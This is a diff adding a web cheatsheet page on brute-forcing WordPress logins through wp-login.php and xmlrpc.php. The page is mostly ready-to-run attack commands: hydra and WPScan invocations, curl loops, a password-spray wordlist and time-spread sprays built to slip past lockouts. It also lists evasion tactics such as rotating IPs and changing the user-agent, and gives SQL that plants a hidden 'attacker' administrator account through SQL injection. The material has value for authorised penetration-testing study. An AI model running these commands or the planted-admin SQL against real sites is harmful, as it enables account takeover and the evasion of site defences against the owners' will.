@@ -1,0 +1,324 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Login Brute-Force · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › WordPress</nav><h1>Login Brute-Force</h1><p class="cx-lede">Brute-forcing WordPress credentials - the wp-login.php form path vs the xmlrpc.php API path, WPScan&#x27;s password-attack mode, hydra&#x27;s wordpress module, and detection-aware patterns including password spray and slowdowns to evade lockouts.</p><div class="cx-tags"><span class="cx-tag">MITRE T1110, T1110.001, T1110.003, T1078</span><span class="cx-tag">D3FEND D3-MFA</span><span class="cx-tag">IMPACT CredentialTheft, AuthBypass</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Brute-forcing WordPress credentials with a user list (from <a href="../user-enumeration/index.html">User Enumeration</a>) is one of the most reliable paths to admin access on the public web. Two attack endpoints; one heavily monitored, one often not:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># wp-login.php - the form-based login (rate-limited on hardened sites)
+hydra -L users.txt -P passwords.txt http-post-form \
+  &#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect&#x27; target.com
+
+# xmlrpc.php - the API path (often not rate-limited)
+wpscan --url http://target --password-attack xmlrpc -U admin -P passwords.txt -t 20
+
+# Spray (one common password across many users - defeats per-user lockouts)
+wpscan --url http://target --password-attack xmlrpc -U users.txt -P single_pass.txt</code></pre></figure>
+<p>Success indicator: a confirmed <code>&lt;user&gt;:&lt;password&gt;</code> pair that you can then use to log into <code>wp-admin</code> and proceed to RCE.</p>
+<h2 id="two-attack-endpoints">Two attack endpoints</h2>
+<p>WordPress accepts authentication on (at least) two endpoints. They have substantially different operational characteristics:</p>
+<table>
+<thead>
+<tr>
+<th>Aspect</th>
+<th><code>wp-login.php</code></th>
+<th><code>xmlrpc.php</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Protocol</td>
+<td>HTML form POST</td>
+<td>XML-RPC method call</td>
+</tr>
+<tr>
+<td>Rate limiting (default)</td>
+<td>None core; many plugins add it</td>
+<td>None core; some plugins add it</td>
+</tr>
+<tr>
+<td>CAPTCHA support</td>
+<td>Common via plugins</td>
+<td>Rare</td>
+</tr>
+<tr>
+<td>Audit logging</td>
+<td>Heavily logged on hardened sites</td>
+<td>Less commonly monitored</td>
+</tr>
+<tr>
+<td>Speed per request</td>
+<td>Slow (synchronous WP bootstrap)</td>
+<td>Slightly faster (different bootstrap path)</td>
+</tr>
+<tr>
+<td>Speed per HTTP request</td>
+<td>1 attempt</td>
+<td>Up to ~150 via <code>system.multicall</code></td>
+</tr>
+<tr>
+<td>Often disabled?</td>
+<td>No (would break user login)</td>
+<td>Yes (via Wordfence, iThemes, etc.)</td>
+</tr>
+<tr>
+<td>Differential error responses</td>
+<td>Yes (user-exists vs password-wrong) by default</td>
+<td>Yes (faultString)</td>
+</tr>
+</tbody>
+</table>
+<p>The operational implication: when both endpoints are reachable, <code>xmlrpc.php</code> is usually the right choice. When only <code>wp-login.php</code> is reachable (xmlrpc disabled), use the form path but accept the noise.</p>
+<h2 id="wp-loginphp-form-mechanics">wp-login.php form mechanics</h2>
+<p>The login form submits to <code>wp-login.php</code> itself with these parameters:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>POST /wp-login.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+log=admin&amp;pwd=password&amp;wp-submit=Log+In&amp;redirect_to=%2Fwp-admin%2F&amp;testcookie=1</code></pre></figure>
+<p>Key fields:</p>
+<ul>
+<li><code>log</code> - username</li>
+<li><code>pwd</code> - password</li>
+<li><code>wp-submit</code> - the submit button name (<code>Log In</code>)</li>
+<li><code>redirect_to</code> - where to send the user after success</li>
+<li><code>testcookie</code> - set by WordPress to check the browser accepts cookies; must be <code>1</code></li>
+</ul>
+<p>A successful login returns a 302 redirect to <code>redirect_to</code> (default <code>/wp-admin/</code>) with <code>wordpress_logged_in_*</code> cookies set. A failed login returns a 200 OK with the login form re-rendered and an error message.</p>
+<h3 id="reading-the-response">Reading the response</h3>
+<p>Differential markers in the response body:</p>
+<table>
+<thead>
+<tr>
+<th>Body contains</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>is not registered on this site</code></td>
+<td>Username doesn't exist</td>
+</tr>
+<tr>
+<td><code>The password you entered for the username</code></td>
+<td>Username exists, password wrong</td>
+</tr>
+<tr>
+<td><code>is incorrect</code> (alone, in a generic error)</td>
+<td>Hardened error - could be either</td>
+</tr>
+<tr>
+<td>(No login form, no error)</td>
+<td>Login succeeded - the 302 redirect happened</td>
+</tr>
+</tbody>
+</table>
+<p>For Hydra and similar tools, the failure marker is <code>is incorrect</code>:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">hydra -L users.txt -P passwords.txt -V \
+  http-post-form &#x27;target.com:/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect&#x27;</code></pre></figure>
+<p><code>-V</code> shows each attempt. The <code>:F=</code> parameter is the failure marker - Hydra treats any response <em>not</em> containing this string as success. Tune the marker to whatever error string the target actually returns; some hardened installs return generic <code>password you entered is incorrect</code> for both invalid-user and invalid-password cases.</p>
+<h3 id="cookie-nonce-handling">Cookie / nonce handling</h3>
+<p>WordPress sets a <code>wordpress_test_cookie</code> on initial visit and the form submission can optionally include nonces. For modern WordPress, basic form submission without these still works - the test cookie is set client-side and the form post-back includes it via the user's browser, but bare-metal HTTP clients can submit without it.</p>
+<p>When a target's <code>wp-login.php</code> is hardened with a custom plugin (e.g., requires a CAPTCHA, a hidden field timestamp, or a custom nonce), the simple Hydra approach fails. Workarounds:</p>
+<ul>
+<li>Burp Intruder with session-handling rules that fetch the form first, extract nonces, and reuse them</li>
+<li>A custom script using <code>requests</code> (Python) or similar that handles the session</li>
+</ul>
+<p>For most targets without those defenses, the simple form submission works.</p>
+<h2 id="xmlrpcphp-brute-force-mechanics">xmlrpc.php brute-force mechanics</h2>
+<p>The <code>xmlrpc.php</code> brute-force uses <code>wp.getUsersBlogs</code> as the credential-validation primitive. See <a href="../xmlrpc-abuse/index.html">XML-RPC abuse</a> for the protocol details.</p>
+<h3 id="wpscans-xmlrpc-mode">WPScan's xmlrpc mode</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">wpscan --password-attack xmlrpc \
+  --url http://target/ \
+  -U admin,david,roger \
+  -P /usr/share/wordlists/rockyou.txt \
+  -t 20</code></pre></figure>
+<p>Key flags:</p>
+<ul>
+<li><code>--password-attack xmlrpc</code> - use the xmlrpc.php path</li>
+<li><code>--password-attack wp-login</code> - use wp-login.php (default for older WPScan versions)</li>
+<li><code>-U user1,user2,...</code> - username list (comma-separated or <code>@filename</code>)</li>
+<li><code>-P /path/to/wordlist</code> - password wordlist</li>
+<li><code>-t 20</code> - threads (default 5; up to 30 is reasonable; higher invites rate-limit responses)</li>
+</ul>
+<p>Output for a hit:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>[+] Performing password attack on Xmlrpc against 3 user/s
+
+[SUCCESS] - admin / sunshine1
+Trying david / Spring2016  Time: 00:00:01 &lt;==========&gt; (474 / 474) 100.00% Time: 00:00:01
+
+[i] Valid Combinations Found:
+ | Username: admin, Password: sunshine1</code></pre></figure>
+<h3 id="manual-xmlrpc-brute-force-loop">Manual xmlrpc brute-force loop</h3>
+<p>Without WPScan, plain curl in a loop:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">USERS=&quot;admin david roger erika&quot;
+while read pass; do
+  for user in $USERS; do
+    resp=$(curl -s -X POST -d &quot;&lt;?xml version=&#x27;1.0&#x27;?&gt;
+&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+&lt;params&gt;&lt;param&gt;&lt;value&gt;${user}&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;${pass}&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
+&lt;/methodCall&gt;&quot; http://target/xmlrpc.php)
+    if echo &quot;$resp&quot; | grep -q &#x27;&lt;isAdmin&gt;&#x27;; then
+      echo &quot;FOUND: $user / $pass&quot;
+    fi
+  done
+done &lt; passwords.txt</code></pre></figure>
+<p>This is slower than WPScan but works when WPScan isn't available or when you need to customize the payload (e.g., to bypass a WAF that's specifically pattern-matching WPScan).</p>
+<h3 id="systemmulticall-amplification">system.multicall amplification</h3>
+<p>To submit hundreds of attempts in one HTTP request, build a multicall payload (see <a href="../xmlrpc-abuse/index.html">XML-RPC abuse</a> for the structure). WPScan does this internally when threads are high and the wordlist is large; manually, it's a bigger payload to construct.</p>
+<p>Practical caveat: WordPress 4.4+ limits multicall to ~150 calls per request. Older installs accept much more.</p>
+<h2 id="hydra-wordpress-module">Hydra wordpress module</h2>
+<p>Hydra supports HTTP form auth directly:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">hydra -L users.txt -P passwords.txt -t 4 -f -V \
+  target.com http-post-form \
+  &#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect&#x27;</code></pre></figure>
+<p>Flags:</p>
+<ul>
+<li><code>-L</code> username file (lowercase = list)</li>
+<li><code>-P</code> password file</li>
+<li><code>-t 4</code> four parallel threads</li>
+<li><code>-f</code> stop on first found credential</li>
+<li><code>-V</code> verbose</li>
+</ul>
+<p>For HTTPS targets:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">hydra -L users.txt -P passwords.txt -t 4 -f -V \
+  target.com https-post-form \
+  &#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect&#x27;</code></pre></figure>
+<p>The <code>^USER^</code> and <code>^PASS^</code> placeholders are Hydra's variable syntax.</p>
+<h2 id="password-spray">Password spray</h2>
+<p>Brute-force with many passwords per user invites per-user account lockout. Spray with one password across many users instead:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">wpscan --url http://target/ --password-attack xmlrpc \
+  -U users.txt -P single_password.txt -t 10</code></pre></figure>
+<p>Where <code>single_password.txt</code> contains exactly one line like <code>Spring2024!</code>. The result: each user gets exactly one login attempt. No per-user lockout trips.</p>
+<p>Common patterns to spray, in order of historical success rate:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Welcome1
+Welcome123
+Spring2024
+Spring2024!
+Summer2024!
+Password1
+Password123!
+&lt;CompanyName&gt;2024
+&lt;CompanyName&gt;2024!
+&lt;CompanyName&gt;123</code></pre></figure>
+<p>Replace <code>&lt;CompanyName&gt;</code> with the target's name. Many targets use a "default new-user password" that's a hardcoded template; the company name is almost always part of it.</p>
+<p>When a spray succeeds, the user whose password happens to be the spray target may be an unexpected role (Subscriber, Editor) - not always the admin. But any logged-in identity is useful - Authors and above can upload media, Editors can edit posts, and the <a href="../admin-to-rce/index.html">admin-to-RCE chain</a> sometimes works from non-admin roles too.</p>
+<h3 id="time-spread-spray">Time-spread spray</h3>
+<p>To evade lockouts that are based on per-source-IP attempt rate:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">for user in $(cat users.txt); do
+  sleep $((RANDOM % 30 + 30))    # 30-60s between attempts
+  curl -s -X POST -d &quot;&lt;?xml version=&#x27;1.0&#x27;?&gt;
+&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+&lt;params&gt;&lt;param&gt;&lt;value&gt;${user}&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;Spring2024!&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
+&lt;/methodCall&gt;&quot; http://target/xmlrpc.php | grep -qE &#x27;&lt;isAdmin&gt;&#x27; &amp;&amp; echo &quot;FOUND: $user&quot;
+done</code></pre></figure>
+<p>Trade time for stealth. A 30-60s delay between attempts looks like normal user activity in the source IP's connection log.</p>
+<h2 id="lockout-aware-patterns">Lockout-aware patterns</h2>
+<p>Common lockout configurations and how to handle them:</p>
+<h3 id="per-user-lockout-eg-ithemes-security-default-5-failed-attempts-in-5-minutes-lock-for-15-minutes">Per-user lockout (e.g., iThemes Security default: 5 failed attempts in 5 minutes → lock for 15 minutes)</h3>
+<ul>
+<li>Spray rather than brute-force (one attempt per user, no lockout)</li>
+<li>If brute-forcing one specific user, throttle to under 5 attempts per 5 minutes</li>
+<li>Switch users frequently - never hammer one account</li>
+</ul>
+<h3 id="per-ip-lockout-eg-wordfence-block-ip-for-5-minutes-after-20-failed-login-attempts">Per-IP lockout (e.g., Wordfence "Block IP for 5 minutes after 20 failed login attempts")</h3>
+<ul>
+<li>Time-spread (spread attempts over the lockout window)</li>
+<li>Use multiple source IPs (proxies, cloud rotating IPs)</li>
+<li>Switch to <code>xmlrpc.php</code> if the lockout is <code>wp-login.php</code>-only (and vice versa)</li>
+</ul>
+<h3 id="captcha-on-n-th-failure">CAPTCHA on N-th failure</h3>
+<ul>
+<li>Some plugins (Google reCAPTCHA, hCaptcha integrated plugins) add a CAPTCHA after the first failure. Manual completion of CAPTCHA defeats brute-force entirely for that source.</li>
+<li>Switch to <code>xmlrpc.php</code> which typically lacks CAPTCHA integration.</li>
+</ul>
+<h3 id="cloudflare-or-waf-in-front">Cloudflare or WAF in front</h3>
+<ul>
+<li>Pattern detection on request bodies (e.g., requests with <code>pwd=</code> and <code>wp-submit=</code> are flagged)</li>
+<li>Often catches WPScan's default user-agent</li>
+<li>Workarounds: change user-agent (<code>wpscan --user-agent "..."</code>), randomize request timing, slow down</li>
+</ul>
+<h2 id="validating-found-credentials">Validating found credentials</h2>
+<p>Once a brute-force result claims success, verify by attempting an actual login:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Get the auth cookie
+curl -i -c cookies.txt -X POST -d &#x27;log=admin&amp;pwd=sunshine1&amp;wp-submit=Log+In&#x27; \
+  http://target/wp-login.php
+
+# Check for wordpress_logged_in_* cookie in the response
+grep wordpress_logged_in cookies.txt</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>target.com  FALSE  /  TRUE  0  wordpress_logged_in_&lt;hash&gt;  admin|1234567890|...|...</code></pre></figure>
+<p>If <code>wordpress_logged_in_&lt;hash&gt;</code> is set, login succeeded. Use the cookies file with subsequent curl calls:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl -b cookies.txt http://target/wp-admin/
+# Should return the dashboard HTML, not a redirect to wp-login.php</code></pre></figure>
+<p>If the response is a redirect to <code>wp-login.php</code>, the brute-force "success" was a false positive - sometimes happens with hardened error pages that fool Hydra's failure marker.</p>
+<h2 id="direct-admin-user-creation-via-sql">Direct admin user creation via SQL</h2>
+<p>When you have SQL-injection access to the WP database (via a vulnerable plugin's SQLi - see <a href="../vulnerable-plugins/index.html">Vulnerable Plugins</a> or <a href="../../sqli/index.html">SQL Injection cluster</a>), you can skip the brute-force and just insert an admin user:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- WordPress password hash format: phpass-portable, ~60 chars
+-- The hash below is for &quot;Password123!&quot;
+INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, display_name)
+VALUES (&#x27;attacker&#x27;, &#x27;$P$BFqBfvWtsHHGzVKVR2KvI6Js2gMQ4Q.&#x27;, &#x27;a@a.com&#x27;, NOW(), &#x27;attacker&#x27;);
+
+-- Get the user ID
+-- Then grant admin role:
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
+VALUES (LAST_INSERT_ID(), &#x27;wp_capabilities&#x27;, &#x27;a:1:{s:13:&quot;administrator&quot;;b:1;}&#x27;);
+
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
+VALUES (LAST_INSERT_ID(), &#x27;wp_user_level&#x27;, &#x27;10&#x27;);</code></pre></figure>
+<p><code>wp_capabilities</code> with the serialized PHP value <code>a:1:{s:13:"administrator";b:1;}</code> makes the user an administrator. The <code>wp_user_level</code> <code>10</code> is the legacy numeric privilege level (10 = administrator).</p>
+<p>After this, log in with <code>attacker</code>:<code>Password123!</code>. From there, the <a href="../admin-to-rce/index.html">admin-to-RCE chain</a>.</p>
+<p>To generate a phpass hash for an arbitrary password:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Using a small PHP script
+echo &quot;&lt;?php require &#x27;wp-includes/class-phpass.php&#x27;; \$hasher = new PasswordHash(8, true); echo \$hasher-&gt;HashPassword(&#x27;MyPassword&#x27;) . PHP_EOL;&quot; &gt; hash.php
+php hash.php
+
+# Or with Python phpass library
+python3 -c &quot;from phpass import PasswordHash; ph = PasswordHash(8, True); print(ph.hash_password(b&#x27;MyPassword&#x27;).decode())&quot;</code></pre></figure>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Hydra wp-login</td>
+<td><code>hydra -L users -P pass target http-post-form '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect'</code></td>
+</tr>
+<tr>
+<td>WPScan xmlrpc</td>
+<td><code>wpscan --url URL --password-attack xmlrpc -U USERS -P PASS -t 20</code></td>
+</tr>
+<tr>
+<td>WPScan wp-login</td>
+<td><code>wpscan --url URL --password-attack wp-login -U USERS -P PASS -t 20</code></td>
+</tr>
+<tr>
+<td>Single-pass spray</td>
+<td><code>wpscan --url URL --password-attack xmlrpc -U USERS -P single.txt</code></td>
+</tr>
+<tr>
+<td>Manual xmlrpc loop</td>
+<td>bash with curl + <code>wp.getUsersBlogs</code> body</td>
+</tr>
+<tr>
+<td>Verify creds</td>
+<td><code>curl -i -c cookies.txt -X POST -d 'log=USER&amp;pwd=PASS&amp;wp-submit=Log+In' http://target/wp-login.php</code></td>
+</tr>
+<tr>
+<td>Check verified login</td>
+<td><code>curl -b cookies.txt http://target/wp-admin/</code> (expect dashboard, not redirect)</td>
+</tr>
+<tr>
+<td>Time-spread spray</td>
+<td>bash loop with <code>sleep $((RANDOM % 30 + 30))</code></td>
+</tr>
+<tr>
+<td>Generate phpass hash</td>
+<td><code>php -r "require 'class-phpass.php'; \$h=new PasswordHash(8,true); echo \$h-&gt;HashPassword('pw');"</code></td>
+</tr>
+</tbody>
+</table></article><nav class="cx-pager"><a class="cx-prev" href="../xmlrpc-abuse/index.html">Previous: XML-RPC Abuse</a><a class="cx-next" href="../vulnerable-plugins/index.html">Next: Vulnerable Plugins</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
